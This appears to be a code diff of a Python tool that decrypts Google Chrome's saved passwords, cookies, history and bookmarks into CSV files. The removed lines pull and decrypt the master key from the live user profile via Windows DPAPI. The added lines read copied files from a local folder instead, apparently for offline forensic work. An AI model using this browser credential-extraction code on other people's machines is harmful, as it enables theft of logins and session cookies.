@@ -14,13 +14,9 @@ import win32crypt
 from Crypto.Cipher import AES
 
 def get_master_key():
-    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = master_key[5:]  # removing DPAPI
-    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-    return master_key
+    with open("Sourse_Data\masterkey",'rb') as key:
+        master_key = key.read()
+        return master_key
 
 # Decrypt encrypted value in Chrome version < 80
 def decrypt_value(buff, master_key):
@@ -81,14 +77,13 @@ def read_db(csv_path, csv_head, sql):
                 data = []
             return 0
         except Exception as e:
-            # raise e
+            raise e
             return 1
     cursor.close()
     conn.close()
 
 # Get data in sqlite db
-def get_db_data(db_path, csv_path, csv_head, sql):
-    target_db = os.environ['USERPROFILE'] + os.sep + db_path
+def get_db_data(target_db, csv_path, csv_head, sql):
     shutil.copy2(target_db, "temp")
     print("[+] Get Chrome Data From " + target_db)
     status = read_db(csv_path, csv_head, sql)
@@ -102,8 +97,7 @@ def get_db_data(db_path, csv_path, csv_head, sql):
         pass
 
 # Get data in json
-def get_json_data(json_path, csv_path, csv_head):
-    target_json = os.environ['USERPROFILE'] + os.sep + json_path
+def get_json_data(target_json, csv_path, csv_head):
     shutil.copy2(target_json, "temp")
     print("[+] Get Chrome Data From " + target_json)
     with open(csv_path, 'w', newline = '', encoding = "utf-8-sig") as csv_file:
@@ -130,10 +124,10 @@ def get_json_data(json_path, csv_path, csv_head):
 def main():
     # Target File Path
     TARGET_FILE_PATH = {
-        "CHROME_PASSWORDS_DB_PATH"   : r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
-        "CHROME_COOKIES_DB_PATH"     : r"AppData\Local\Google\Chrome\User Data\Default\Cookies",
-        "CHROME_HISTORY_DB_PATH"     : r"AppData\Local\Google\Chrome\User Data\Default\History",
-        "CHROME_BOOKMARKS_FILE_PATH" : r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+        "CHROME_PASSWORDS_DB_PATH"   : r"Sourse_Data\Login Data",
+        "CHROME_COOKIES_DB_PATH"     : r"Sourse_Data\Cookies",
+        "CHROME_HISTORY_DB_PATH"     : r"Sourse_Data\History",
+        "CHROME_BOOKMARKS_FILE_PATH" : r"Sourse_Data\Bookmarks"
     }
     # Result File Path
     RESULT_FILE_PATH = {
